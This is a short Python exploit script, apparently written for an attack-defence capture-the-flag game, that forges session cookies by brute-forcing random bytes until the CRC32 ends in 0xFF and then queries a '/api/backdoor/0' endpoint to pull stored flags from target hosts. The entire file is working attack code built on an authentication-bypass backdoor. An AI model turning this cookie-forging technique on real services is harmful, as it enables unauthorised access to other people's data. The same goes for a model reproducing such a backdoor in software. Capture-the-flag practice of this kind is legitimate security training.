import requests
from zlib import crc32
import base64
import random

def forge_cookie(username):
    """
    Attempt to sample a cookie with a CRC32 ending in FF
    2048 attempts should suffice in most cases
    """
    for i in range(2048):
        test_cookie = base64.b64encode(b'\xff'+random.randbytes(31) + username.encode()).decode()
        if crc32(test_cookie.encode()) & 0xff == 0xff:
            return test_cookie
    raise ValueError("Cannot forge cookie")

def exploit_one(target, flag_id):
    """
    Flags stored in texts can be retrieved via the backdoor-endpoint
    The backdoor endpoint effectively disables cookie-based authentication, if the CRC32 of the cookie ends in FF
    The result contains the flag, which may also be stored in reverse
    """
    t = requests.get(f"http://{target}:7331/api/backdoor/0", cookies={"Session": forge_cookie(flag_id)}).text
    print(t)
    print(t[::-1])

def exploit(target, flag_ids):
    flag_ids = ','.join(flag_ids).split(',')
    for flag_id in flag_ids:
        try:
            exploit_one(target, flag_id)
        except Exception as e:
            print(e)
            pass


if __name__ == '__main__':
    import sys
    exploit(sys.argv[1] if len(sys.argv) > 1 else 'localhost', sys.argv[2:])
